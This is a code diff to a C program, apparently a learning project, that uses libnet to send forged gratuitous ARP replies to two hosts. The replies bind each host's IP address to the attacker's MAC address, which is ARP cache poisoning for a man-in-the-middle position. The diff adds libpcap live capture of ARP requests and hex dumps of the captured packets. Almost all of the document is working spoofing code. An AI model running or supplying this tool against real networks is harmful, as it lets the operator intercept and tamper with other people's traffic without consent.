@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <libnet.h>
+#include <pcap.h>
 
 void	get_args(int ac, char **av, libnet_t *l, u_int32_t *ip_src,
 		u_int8_t **mac_src, u_int32_t *ip_target, u_int8_t **mac_target)
@@ -85,6 +86,52 @@ void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
 		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
 }
 
+void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
+		const u_char *packet_body)
+{
+	printf("Packet capture length: %d\n", packet_header->caplen);
+	printf("Packet total length %d\n", packet_header->len);
+	printf("Packet body:\n");
+	for (int i = 0; i < packet_header->caplen; i++)
+		printf("%02x ", packet_body[i]);
+	printf("\n");
+}
+
+pcap_t *open_device(char *filter_exp)
+{
+	char	*device;
+	char	error_buffer[PCAP_ERRBUF_SIZE];
+	pcap_t	*handle;
+
+	// Get name device
+	device = pcap_lookupdev(error_buffer);
+	if (!device)
+	{
+		fprintf(stderr, "Error finding device: %s\n", error_buffer);
+		exit(EXIT_FAILURE);
+	}
+	// Open device for live capture
+	handle = pcap_open_live(device, BUFSIZ, 0, -1, error_buffer);
+	if (!handle)
+	{
+		fprintf(stderr, "Could not open device %s: %s\n", device, error_buffer);
+		exit(EXIT_FAILURE);
+	}
+	// Filters
+	struct bpf_program filter;
+	if (pcap_compile(handle, &filter, filter_exp, 0, 0) == -1)
+	{
+		fprintf(stderr, "Bad filter - %s\n", pcap_geterr(handle));
+		exit(EXIT_FAILURE);
+	}
+	if (pcap_setfilter(handle, &filter) == -1)
+	{
+		fprintf(stderr, "Error setting filter - %s\n", pcap_geterr(handle));
+		exit(EXIT_FAILURE);
+	}
+	return (handle);
+}
+
 int main(int ac, char **av)
 {
 	libnet_t	*l;
@@ -101,17 +148,15 @@ int main(int ac, char **av)
 		exit(EXIT_FAILURE);
 	}
 
+	// Get ip and mac addresses
 	get_args(ac, av, l, &ip_src, &mac_src, &ip_target, &mac_target);
 	mac_attacker = get_own_mac(l);
 
 	send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
 	send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
 
-	/*
-	printf("ip_src: %s\nmac_src: %x:%x\n", libnet_addr2name4(ip_src, LIBNET_DONT_RESOLVE), mac_src[0], mac_src[1]);
-	printf("ip_target: %d\nmac_target: %x:%x\n", ip_target, mac_target[0], mac_target[1]);
-	printf("mac_attacker: %02x:%02x:%02x:%02x:%02x:%02x\n", mac_attacker[0], mac_attacker[1], mac_attacker[2], mac_attacker[3], mac_attacker[4], mac_attacker[5]);
-	*/
+	pcap_t *handle = open_device("arp and arp[6:2] == 1"); // Arp request
+	pcap_loop(handle, 0, packet_handler, NULL);
 
 	free(mac_src);
 	free(mac_target);
